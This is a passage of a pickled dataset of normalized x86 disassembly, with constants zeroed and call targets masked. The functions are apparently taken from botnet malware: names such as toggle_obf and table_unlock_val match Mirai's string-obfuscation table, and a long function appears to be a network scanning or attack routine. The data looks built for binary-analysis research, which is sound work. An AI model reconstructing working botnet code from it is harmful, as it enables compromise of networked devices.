OO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,EDX\nMOV~ECX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,EDX\nMOV~ECX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,EDX\nMOV~ECX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,EDX\nMOV~ECX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,EDX\nMOV~ECX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,EDX\nMOV~ECX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,EDX\nMOV~ECX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,EDX\nMOV~ECX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,EDX\nMOV~ECX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,EDX\nMOV~ECX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EBP,<STR>\nCMP~EBP,[ESP+0]\nJZ~FOO\nMOV~[ESP+0],0\nCLD\nXOR~EAX,EAX\nLEA~EDI,[ESP+0]\nSTOSD~,\nSTOSD~,\nSTOSD~,\nSTOSD~,\nCALL~FOO\nMOV~<STR>,AX\nMOV~EAX,<STR>\nMOV~<STR>,EAX\nCALL~FOO\nMOV~EBX,EAX\nMOV~EDX,EAX\nMOV~ESI,EAX\nMOV~CL,AL\nSHR~EBX,0\nSHR~EDX,0\nSHR~ESI,0\nCMP~AL,0\nJZ~FOO\nTEST~AL,AL\nJZ~FOO\nCMP~AL,0\nJZ~FOO\nLEA~EAX,[EAX-0]\nCMP~AL,0\nJBE~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJNZ~FOO\nCMP~BL,0\nJZ~FOO\nJMP~FOO\nCMP~CL,0\nJNZ~FOO\nCMP~BL,0\nJBE~FOO\nCMP~BL,0\nJBE~FOO\nJMP~FOO\nCMP~CL,0\nJNZ~FOO\nCMP~BL,0\nJBE~FOO\nCMP~BL,0\nJBE~FOO\nJMP~FOO\nCMP~CL,0\nJNZ~FOO\nCMP~BL,0\nJZ~FOO\nJMP~FOO\nCMP~CL,0\nJNZ~FOO\nCMP~BL,0\nJBE~FOO\nCMP~BL,0\nJBE~FOO\nJMP~FOO\nCMP~CL,0\nJA~FOO\nLEA~EAX,[ECX-0]\nCMP~AL,0\nJBE~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nMOVZX~EAX,BL\nSHL~EAX,0\nMOV~EBX,ESI\nSHL~ECX,0\nMOV~<STR>,0\nOR~ECX,EAX\nMOVZX~EDX,DL\nMOVZX~EAX,BL\nOR~ECX,EAX\nPUSH~EBX\nSHL~EDX,0\nPUSH~EBX\nOR~EDX,ECX\nPUSH~0\nROR~DX,0\nROR~EDX,0\nROR~DX,0\nPUSH~0\nMOV~<STR>,EDX\nCALL~FOO\nMOV~EDX,0\nMOV~<STR>,AX\nMOV~EAX,[ESP+0]\nMOV~ECX,EDX\nADD~ESP,0\nCDQ~,\nIDIV~,ECX\nTEST~EDX,EDX\nJNZ~FOO\nMOV~<STR>,0\nJMP~FOO\nMOV~<STR>,0\nMOV~EAX,<STR>\nPUSH~0\nMOV~<STR>,EAX\nPUSH~0\nMOV~<STR>,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~<STR>,AX\nMOV~EAX,<STR>\nMOV~[ESP+0],EAX\nMOV~AX,<STR>\nMOV~[ESP+0],AX\nMOV~[ESP+0],0\nLEA~EAX,[ESP+0]\nPOP~EDX\nPOP~ECX\nPUSH~0\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~<STR>\nCALL~FOO\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~EAX,0\nJLE~FOO\nMOV~[ESP+0],EBP\nCALL~FOO\nXOR~EBX,EBX\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~DWORDPTR[EAX],0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJLE~FOO\nMOV~EDX,[ESP+0]\nCMP~DWORDPTR[EDX],0\nJZ~FOO\nCMP~EAX,0\nJBE~FOO\nMOV~EAX,[ESP+0]\nCMP~EAX,<STR>\nJNZ~FOO\nCMP~[ESP+0],0\nJNZ~FOO\nMOV~EAX,[ESP+0]\nLEA~ESI,[ESP+0]\nCMP~AX,0\nJZ~FOO\nCMP~AX,0\nJNZ~FOO\nMOV~CX,[ESP+0]\nCMP~[ESP+0],CX\nJNZ~FOO\nMOV~AL,[ESP+0]\nTEST~AL,0\nJZ~FOO\nTEST~AL,0\nJZ~FOO\nTEST~AL,0\nJNZ~FOO\nTEST~AL,0\nJNZ~FOO\nMOV~EAX,[ESP+0]\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nLEA~ECX,[EAX-0]\nROR~CX,0\nROR~ECX,0\nROR~CX,0\nCMP~ECX,[ESP+0]\nJNZ~FOO\nIMUL~EAX,EBX,0\nADD~EAX,<STR>\nJMP~FOO\nMOV~EDX,EAX\nLEA~EAX,[EAX+0]\nCMP~[EDX+0],0\nJZ~FOO\nINC~EBX\nCMP~EBX,0\nJLE~FOO\nJMP~FOO\nMOV~EAX,[ESI]\nMOV~[EDX+0],ECX\nMOV~[EDX+0],AX\nMOV~EAX,EDX\nCALL~FOO\nJMP~FOO\nMOV~EDX,0\nXOR~EAX,EAX\nLEA~EDI,[ESP+0]\nMOV~ECX,EDX\nCLD\nSTOSD~,\nLEA~EDI,[ESP+0]\nMOV~ECX,EDX\nCLD\nSTOSD~,\nXOR~EDI,EDI\nMOV~[ESP+0],0\nXOR~ESI,ESI\nIMUL~EBX,EAX,0\nADD~EBX,<STR>\nMOV~ECX,0\nMOV~EDX,[EBX+0]\nCMP~EDX,0\nJA~FOO\nTEST~EDX,EDX\nJZ~FOO\nMOV~CL,0\nMOV~EAX,<STR>\nSUB~EAX,[EBX+0]\nCMP~EAX,ECX\nJBE~FOO\nSUB~ESP,0\nPUSH~[EBX+0]\nCALL~FOO\nADD~ESP,0\nMOV~[EBX+0],0\nCMP~[EBX+0],0\nJBE~FOO\nMOV~AL,[EBX+0]\nINC~EAX\nMOV~[EBX+0],AL\nCMP~AL,0\nJZ~FOO\nMOV~EAX,EBX\nCALL~FOO\nJMP~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nJMP~FOO\nDEC~EDX\nMOV~EDX,[EBX+0]\nJNZ~FOO\nMOV~EAX,EDX\nAND~EDX,0\nSHR~EAX,0\nBTS~[ESP+EAX*4+0],EDX\nMOV~EAX,[EBX+0]\nCMP~EAX,ESI\nJLE~FOO\nMOV~ESI,EAX\nJMP~FOO\nMOV~EAX,EDX\nAND~EDX,0\nSHR~EAX,0\nBTS~[ESP+EAX*4+0],EDX\nMOV~EAX,[EBX+0]\nCMP~EAX,EDI\nJLE~FOO\nMOV~EDI,EAX\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nCMP~EAX,0\nJLE~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nSUB~ESP,0\nCMP~EDI,ESI\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nMOV~EAX,EDI\nJGE~FOO\nMOV~EAX,ESI\nINC~EAX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],0\nMOV~<STR>,EAX\nADD~ESP,0\nXOR~EAX,EAX\nIMUL~EBX,EAX,0\nADD~EBX,<STR>\nMOV~EDX,[EBX+0]\nCMP~EDX,0\nJZ~FOO\nMOV~EAX,EDX\nSHR~EDX,0\nAND~EAX,0\nBT~[ESP+EDX*4+0],EAX\nSETB~AL\nTEST~AL,AL\nJZ~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nSUB~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~[EBX+0]\nCALL~FOO\nADD~ESP,0\nOR~EAX,[ESP+0]\nJNZ~FOO\nMOV~[EBX+0],0\nCALL~FOO\nMOV~ESI,<STR>\nMOVZX~EDX,<STR>\nMOV~ECX,EDX\nXOR~EDX,EDX\nDIV~,ECX\nMOV~EAX,<STR>\nXOR~ECX,ECX\nJMP~FOO\nCMP~DX,[EAX+0]\nJB~FOO\nCMP~DX,[EAX+0]\nJB~FOO\nINC~ECX\nADD~EAX,0\nCMP~ECX,ESI\nJL~FOO\nXOR~EAX,EAX\nMOV~[EBX],EAX\nMOV~[EBX+0],0\nJMP~FOO\nSUB~ESP,0\nPUSH~[EBX+0]\nCALL~FOO\nADD~ESP,0\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nJMP~FOO\nMOV~EAX,[EBX+0]\nMOV~EDX,EAX\nSHR~EAX,0\nAND~EDX,0\nBT~[ESP+EAX*4+0],EDX\nSETB~DL\nTEST~DL,DL\nJZ~FOO\nCMP~[EBX+0],0\nJZ~FOO\nCMP~[EBX+0],0\nJNZ~FOO\nLEA~EDX,[EBX+0]\nPUSH~EAX\nLEA~EAX,[EBX+0]\nPUSH~0\nPUSH~EAX\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nSUB~[EBX+0],0\nMOV~EAX,[ESP+0]\nLEA~ECX,[EBX+0]\nMOV~[ESP+0],ECX\nMOV~DWORDPTR[EAX],0\nMOV~EAX,0\nMOV~EDX,[EBX+0]\nPUSH~0\nSUB~EAX,EDX\nADD~EDX,ECX\nPUSH~EAX\nPUSH~EDX\nPUSH~[EBX+0]\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJNZ~FOO\nMOV~EAX,[ESP+0]\nMOV~DWORDPTR[EAX],0\nJMP~FOO\nCMP~EAX,0\nJNZ~FOO\nMOV~EDX,[ESP+0]\nCMP~DWORDPTR[EDX],0\nJZ~FOO\nSUB~ESP,0\nPUSH~[EBX+0]\nCALL~FOO\nMOV~AL,[EBX+0]\nINC~EAX\nADD~ESP,0\nMOV~[EBX+0],0\nMOV~[EBX+0],AL\nCMP~AL,0\nJBE~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nJMP~FOO\nMOV~EAX,EBX\nCALL~FOO\nJMP~FOO\nADD~[EBX+0],EAX\nMOV~EAX,<STR>\nMOV~[EBX+0],EAX\nMOV~EAX,[EBX+0]\nSUB~EAX,0\nCMP~EAX,0\nJA~FOO\nJMP~<STR>\nLEA~EDI,[EBX+0]\nXOR~EBP,EBP\nJMP~FOO\nCMP~BYTEPTR[EDI],0\nJNZ~FOO\nMOV~ECX,0\nMOV~EDX,EDI\nMOV~EAX,EBX\nCALL~FOO\nTEST~AL,AL\nJZ~FOO\nMOV~AL,[EDI+0]\nCMP~AL,0\nJNZ~FOO\nADD~EDI,0\nADD~EBP,0\nJMP~FOO\nCMP~AL,0\nJNZ~FOO\nLEA~ESI,[ESP+0]\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,EDI\nMOV~EAX,EBX\nCALL~FOO\nADD~ESP,0\nTEST~AL,AL\nJZ~FOO\nCMP~[EDI+0],0\nJNZ~FOO\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nADD~EDI,0\nPUSH~EAX\nADD~EBP,0\nPUSH~[EBX+0]\nCALL~FOO\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~[EBX+0]\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~ECX,0\nMOV~EDX,EDI\nMOV~EAX,EBX\nCALL~FOO\nTEST~AL,AL\nJZ~FOO\nMOV~EDX,0\nMOV~AL,[EDX+EDI-0]\nCMP~AL,0\nJNZ~FOO\nMOV~[EDX+EDI-0],0\nJMP~FOO\nCMP~AL,0\nJNZ~FOO\nMOV~[EDX+EDI-0],0\nINC~EDX\nCMP~EDX,0\nJNZ~FOO\nPUSH~0\nPUSH~0\nPUSH~EDI\nADD~EBP,0\nPUSH~[EBX+0]\nADD~EDI,0\nCALL~FOO\nADD~ESP,0\nCMP~EBP,[EBX+0]\nJL~FOO\nTEST~EBP,EBP\nJLE~FOO\nMOV~[EBX+0],0\nJMP~FOO\nMOV~ECX,[EBX+0]\nLEA~EAX,[ECX-0]\nJMP~FOO\nMOV~DL,[EAX+EBX+0]\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJNZ~FOO\nLEA~EBP,[EAX+0]\nCMP~EBP,0\nJNZ~FOO\nJMP~FOO\nDEC~EAX\nTEST~EAX,EAX\nJG~FOO\nPUSH~0\nPUSH~0\nPUSH~ECX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nMOV~EBP,EAX\nCMP~EAX,0\nJNZ~FOO\nPUSH~0\nPUSH~0\nPUSH~[EBX+0]\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nMOV~EBP,EAX\nCMP~EAX,0\nJZ~FOO\nTEST~EBP,EBP\nJLE~FOO\nMOV~EDX,[EBX]\nPUSH~0\nMOVZX~EAX,[EDX+0]\nPUSH~EAX\nPUSH~DWORDPTR[EDX]\nPUSH~[EBX+0]\nCALL~FOO\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~[EBX+0]\nCALL~FOO\nMOV~[EBX+0],0\nJMP~FOO\nMOV~ECX,[EBX+0]\nLEA~EAX,[ECX-0]\nJMP~FOO\nMOV~DL,[EAX+EBX+0]\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJNZ~FOO\nLEA~EBP,[EAX+0]\nCMP~EBP,0\nJNZ~FOO\nJMP~FOO\nDEC~EAX\nTEST~EAX,EAX\nJG~FOO\nPUSH~0\nPUSH~0\nPUSH~ECX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nMOV~EBP,EAX\nCMP~EAX,0\nJZ~FOO\nTEST~EBP,EBP\nJLE~FOO\nMOV~EDX,[EBX]\nPUSH~0\nMOVZX~EAX,[EDX+0]\nPUSH~EAX\nPUSH~[EDX+0]\nPUSH~[EBX+0]\nCALL~FOO\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~[EBX+0]\nCALL~FOO\nMOV~[EBX+0],0\nADD~ESP,0\nJMP~FOO\nMOV~EAX,EBX\nCALL~FOO\nMOV~EBP,EAX\nTEST~EAX,EAX\nJLE~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EDI\nPOP~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nPUSH~0\nPUSH~[ESP+0]\nPUSH~EAX\nPUSH~[EBX+0]\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~[EBX+0]\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[EBX+0],0\nJMP~FOO\nMOV~EAX,EBX\nCALL~FOO\nMOV~EBP,EAX\nTEST~EAX,EAX\nJLE~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~ECX\nPOP~ESI\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nPUSH~0\nPUSH~[ESP+0]\nPUSH~EAX\nPUSH~[EBX+0]\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~[EBX+0]\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[EBX+0],0\nJMP~FOO\nMOV~EAX,EBX\nCALL~FOO\nMOV~EBP,EAX\nTEST~EAX,EAX\nJLE~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EAX\nPOP~EDX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nPUSH~0\nPUSH~[ESP+0]\nPUSH~EAX\nPUSH~[EBX+0]\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~[EBX+0]\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[EBX+0],0\nJMP~FOO\nMOV~EAX,EBX\nCALL~FOO\nMOV~EBP,EAX\nTEST~EAX,EAX\nJLE~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EDI\nPOP~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nPUSH~0\nPUSH~[ESP+0]\nPUSH~EAX\nPUSH~[EBX+0]\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~[EBX+0]\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[EBX+0],0\nJMP~FOO\nMOV~EAX,EBX\nCALL~FOO\nMOV~EBP,EAX\nTEST~EAX,EAX\nJLE~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~ECX\nPOP~ESI\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nPUSH~0\nPUSH~[ESP+0]\nPUSH~EAX\nPUSH~[EBX+0]\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~[EBX+0]\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[EBX+0],0\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EAX\nPOP~EDX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nDEC~EDX\nPUSH~EDX\nPUSH~EAX\nPUSH~[EBX+0]\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EBP\nPUSH~[EBX+0]\nCALL~FOO\nMOV~AL,[EBX+0]\nINC~EAX\nADD~ESP,0\nMOV~[EBX+0],0\nMOV~[EBX+0],AL\nCMP~AL,0\nJNZ~FOO\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~ESI\nPOP~EDI\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nDEC~EDX\nPUSH~EDX\nPUSH~EAX\nPUSH~[EBX+0]\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nMOV~EBP,EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nCMP~EBP,0\nJNZ~FOO\nJMP~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nJMP~FOO\nMOV~EAX,EBX\nCALL~FOO\nOR~EBP,0\nJMP~FOO\nMOV~EDX,[EBX]\nMOV~EAX,[EBX+0]\nMOV~[ESP+0],EDX\nMOV~[ESP+0],EAX\nMOVZX~EDX,[EBX+0]\nMOV~[ESP+0],DX\nCALL~FOO\nTEST~EAX,EAX\nJG~FOO\nINC~EAX\nJZ~FOO\nPUSH~ECX\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~ESI,EAX\nCMP~EAX,0\nJNZ~FOO\nSUB~ESP,0\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP],EAX\nCALL~FOO\nADD~ESP,0\nMOV~EDI,EAX\nTEST~EAX,EAX\nJZ~FOO\nMOV~[ESP+0],0\nMOV~EBX,[EAX+0]\nCALL~FOO\nMOVZX~EDX,BYTEPTR[EDI]\nMOV~ECX,EDX\nXOR~EDX,EDX\nDIV~,ECX\nMOV~EAX,[EBX+EDX*4]\nMOV~[ESP+0],EAX\nPUSH~EBP\nPUSH~EBP\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~AX,[EAX]\nMOV~[ESP],EDI\nMOV~[ESP+0],AX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nLEA~EAX,[ESP+0]\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJNZ~FOO\nSUB~ESP,0\nJMP~FOO\nMOV~[ESP+0],0\nPUSH~0\nPUSH~0\nLEA~EBX,[ESP+0]\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nPUSH~0\nPUSH~0\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nPUSH~0\nMOV~EDX,[ESP+0]\nMOVZX~EAX,[EDX+0]\nPUSH~EAX\nPUSH~DWORDPTR[EDX]\nPUSH~ESI\nCALL~FOO\nPUSH~0\nPUSH~0\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nPUSH~0\nMOV~ECX,[ESP+0]\nMOVZX~EAX,[ECX+0]\nPUSH~EAX\nPUSH~[ECX+0]\nPUSH~ESI\nCALL~FOO\nPOP~EDI\nPUSH~ESI\nJMP~FOO\nSUB~ESP,0\nPUSH~[EBX+0]\nCALL~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nADD~ESP,0\nJMP~FOO\nTEST~EBP,EBP\nJZ~FOO\nMOV~EDX,[EBX+0]\nMOV~EAX,EDX\nCMP~EDX,EBP\nJLE~FOO\nMOV~EDX,EBP\nSUB~EAX,EDX\nMOV~[EBX+0],EAX\nPUSH~ESI\nPUSH~EAX\nMOV~EAX,[ESP+0]\nADD~EAX,EDX\nPUSH~EAX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nCMP~EAX,0\nJLE~FOO\nJMP~FOO\nTEST~EBP,EBP\nJG~FOO\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p146
L5230L
tp147
a(S'table_retrieve_val'
p148
S'"MOV~EAX,[ESP+0]\nMOV~ECX,[ESP+0]\nTEST~ECX,ECX\nLEA~EDX,<STR>\nLEA~EAX,[EDX+0]\nJZ~FOO\nMOVZX~EAX,[EAX+0]\nMOV~[ECX],EAX\nMOV~EAX,[EDX+0]\nRETN"'
p149
L38L
tp150
a(S'toggle_obf'
p151
S'"PUSH~EBP\nPUSH~EDI\nMOVZX~EAX,AL\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nLEA~ECX,<STR>\nMOV~EAX,<STR>\nXOR~EDX,EDX\nMOV~EDI,EAX\nMOV~ESI,EAX\nSHR~EDI,0\nMOV~EBP,EAX\nSHR~ESI,0\nSHR~EAX,0\nMOV~[ESP],AL\nJMP~FOO\nMOV~EAX,EDX\nMOV~EBX,EBP\nADD~EAX,[ECX]\nXOR~[EAX],BL\nMOV~EAX,EDX\nADD~EAX,[ECX]\nMOV~EBX,EDI\nXOR~[EAX],BL\nMOV~EAX,EDX\nADD~EAX,[ECX]\nMOV~EBX,ESI\nXOR~[EAX],BL\nMOV~EAX,EDX\nADD~EAX,[ECX]\nMOV~BL,[ESP]\nINC~EDX\nXOR~[EAX],BL\nMOVZX~EAX,[ECX+0]\nCMP~EDX,EAX\nJL~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p152
L94L
tp153
a(S'table_lock_val'
p154
S'"MOVZX~EAX,[ESP+0]\nJMP~FOO"'
p155
L10L
tp156
a(S'table_unlock_val'
p157
S'"MOVZX~EAX,[ESP+0]\nJMP~FOO"'
p158
L10L
tp159
a(S'add_entry'
p160
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EDI,EDX\nMOV~EBX,ECX\nMOV~EBP,EAX\nPUSH~ECX\nCALL~FOO\nADD~ESP,0\nMOV~ESI,EAX\nPUSH~EBX\nPUSH~EDI\nPUSH~EAX\nCALL~FOO\nMOV~EDX,EBP\nMOVZX~EAX,DL\nMOV~<STR>,ESI\nMOV~<STR>,BX\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p161
L60L
tp162
a(S'table_init'
p163
